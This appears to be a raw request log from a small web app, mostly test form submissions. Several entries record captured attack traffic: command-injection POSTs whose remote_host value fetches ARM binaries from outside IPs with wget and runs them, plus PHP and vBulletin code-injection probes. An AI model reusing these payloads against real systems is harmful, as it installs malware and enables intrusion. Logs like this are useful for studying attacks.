 POST, fname=hhh , Sat Aug 01 2020 17:52:10 GMT-0300 (GMT-03:00) 
  POST, fname=hghgh , Sat Aug 01 2020 17:52:31 GMT-0300 (GMT-03:00) 
  POST, fname= , Sat Aug 01 2020 18:03:03 GMT-0300 (GMT-03:00) 
  POST, fname=mbmjh , Sat Aug 01 2020 18:03:36 GMT-0300 (GMT-03:00) 
  POST, fname=njhgjhgj , Sat Aug 01 2020 18:05:35 GMT-0300 (GMT-03:00) 
  POST, fname= , Sat Aug 01 2020 18:07:33 GMT-0300 (GMT-03:00) 
  POST, fname=1234567 , Sat Aug 01 2020 18:13:11 GMT-0300 (GMT-03:00) 
  POST, fname=hgfhgfhg , Sat Aug 01 2020 18:18:37 GMT-0300 (GMT-03:00) 
  POST, fname=aaas , Sat Aug 01 2020 18:19:47 GMT-0300 (GMT-03:00) 
  POST, fname=1234567 , Sat Aug 01 2020 18:22:01 GMT-0300 (GMT-03:00) 
  GET, <?=md5("phpunit")?> , Sat Aug 01 2020 18:23:16 GMT-0300 (GMT-03:00) 
  POST,  remote_submit_Flag=1&remote_syslog_Flag=1&RemoteSyslogSupported=1&LogFlag=0&remote_host=%3bcd+/tmp;wget+http://152.44.44.68/d/xd.arm7;chmod+777+xd.arm7;./xd.arm7;rm+-rf+xd.arm , Sat Aug 01 2020 22:41:42 GMT-0300 (GMT-03:00) 
  POST, fname=1234567 ,  ::ffff:186.18.229.80, Sat Aug 01 2020 22:51:34 GMT-0300 (GMT-03:00) 
  POST,  remote_submit_Flag=1&remote_syslog_Flag=1&RemoteSyslogSupported=1&LogFlag=0&remote_host=%3bcd+/tmp;wget+http://37.49.224.189/taevimncorufglbzhwxqpdkjs/Meth.arm7;chmod+777+Meth ,  ::ffff:34.68.253.25, Sun Aug 02 2020 00:03:09 GMT-0300 (GMT-03:00) 
  POST,  remote_submit_Flag=1&remote_syslog_Flag=1&RemoteSyslogSupported=1&LogFlag=0&remote_host=%3bcd+/tmp;wget+http://152.44.44.68/d/xd.arm7;chmod+777+xd.arm7;./xd.arm7;rm+-rf+xd.arm ,  ::ffff:201.187.99.212, Sun Aug 02 2020 00:14:58 GMT-0300 (GMT-03:00) 
  POST, admin=die(@md5(Apri1)); ,  ::ffff:111.230.157.95, Sun Aug 02 2020 11:19:32 GMT-0300 (GMT-03:00) 
  POST, epass=2dmfrb28nu3c6s9j&routestring=ajax/render/widget_php&widgetConfig[code]=die(@md5(HellovBulletin)); ,  ::ffff:111.230.157.95, Sun Aug 02 2020 11:19:35 GMT-0300 (GMT-03:00) 
  POST, epass=2dmfrb28nu3c6s9j&routestring=ajax/render/widget_php&widgetConfig[code]=die(@md5(HellovBulletin)); ,  ::ffff:111.230.157.95, Sun Aug 02 2020 11:19:36 GMT-0300 (GMT-03:00) 
  POST, epass=2dmfrb28nu3c6s9j&routestring=ajax/render/widget_php&widgetConfig[code]=die(@md5(HellovBulletin)); ,  ::ffff:111.230.157.95, Sun Aug 02 2020 11:19:37 GMT-0300 (GMT-03:00) 
  POST, epass=2dmfrb28nu3c6s9j&routestring=ajax/render/widget_php&widgetConfig[code]=die(@md5(HellovBulletin)); ,  ::ffff:111.230.157.95, Sun Aug 02 2020 11:19:37 GMT-0300 (GMT-03:00) 
  POST, epass=2dmfrb28nu3c6s9j&routestring=ajax/render/widget_php&widgetConfig[code]=die(@md5(HellovBulletin)); ,  ::ffff:111.230.157.95, Sun Aug 02 2020 11:19:38 GMT-0300 (GMT-03:00) 
  POST, epass=2dmfrb28nu3c6s9j&routestring=ajax/render/widget_php&widgetConfig[code]=die(@md5(HellovBulletin)); ,  ::ffff:111.230.157.95, Sun Aug 02 2020 11:19:38 GMT-0300 (GMT-03:00) 
  POST, epass=2dmfrb28nu3c6s9j&routestring=ajax/render/widget_php&widgetConfig[code]=die(@md5(HellovBulletin)); ,  ::ffff:111.230.157.95, Sun Aug 02 2020 11:19:39 GMT-0300 (GMT-03:00) 
  POST, <?php die(@md5(PHP-CGI)); ?> ,  ::ffff:111.230.157.95, Sun Aug 02 2020 11:19:40 GMT-0300 (GMT-03:00) 
  POST, <?php die(@md5(PHP-CGI)); ?> ,  ::ffff:111.230.157.95, Sun Aug 02 2020 11:19:40 GMT-0300 (GMT-03:00) 
  POST, <?php die(@md5(PHP-CGI)); ?> ,  ::ffff:111.230.157.95, Sun Aug 02 2020 11:19:41 GMT-0300 (GMT-03:00) 
